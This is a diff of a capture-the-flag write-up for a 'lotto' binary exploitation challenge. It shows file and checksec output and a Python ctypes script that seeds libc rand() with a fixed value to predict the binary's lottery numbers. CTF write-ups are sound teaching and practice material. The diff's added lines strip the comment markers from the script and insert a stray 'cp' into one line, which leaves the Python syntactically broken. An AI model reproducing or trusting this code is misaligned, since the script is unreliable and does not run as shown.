@@ -1,10 +1,8 @@
-from Break_The_Syntax_CTF
-
-Solution:
 we are given a bin file , which is 
 ```
 󰣇 bts_ctf/pwn/lotto ❯ file lotto.bin                                                                                                             
 lotto.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b33dec53f8f1c8957618364105b1ede0b99ccd8f, for GNU/Linux 4.4.0, not stripped
+```
 󰣇 bts_ctf/pwn/lotto ❯ checksec --file=lotto.bin                                                                                                
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
 Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   40 Symbols	 No	0		3		lotto.bin
@@ -33,11 +31,11 @@ it is at the offset of 307, so after this if we set it to know value we can find
 ```
 import ctypes
 
-# Load C's rand() from libc
+Load C's rand() from libc
 libc = ctypes.CDLL("libc.so.6")
 libc.srand(0xdeadbeef)
 
-# Generate same numbers the binary will use
+cp Generate same numbers the binary will use
 for _ in range(6):
     print(libc.rand() % 49 + 1)  # assuming lotto numbers are 1–49
 
